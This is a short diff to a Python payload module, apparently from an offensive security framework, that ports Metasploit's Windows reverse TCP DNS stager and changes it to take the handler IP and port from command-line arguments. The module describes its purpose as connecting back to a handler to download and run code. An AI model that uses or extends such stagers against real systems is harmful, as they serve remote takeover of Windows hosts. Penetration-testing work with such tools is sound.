@@ -3,20 +3,19 @@
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_tcp_dns.rb
 
 import binascii
-import socket
 
 
 class PayloadModule:
 
-    def __init__(self):
+    def __init__(self, cli_arguments):
         self.name = "Reverse TCP DNS Stager (Stage 1)"
         self.description = "Resolves DNS address, connects back to a handler\
         to download and run fun files :)"
         self.cli_name = "rev_tcp_dns"
         self.platform = "Windows"
         self.arch = "x86"
-        self.lport = 4444
-        self.lhost = None
+        self.lport = int(cli_arguments.port)
+        self.lhost = cli_arguments.ip
         self.retries_offset = 207
         self.lport_offset = 212
         self.lhost_offset = 248
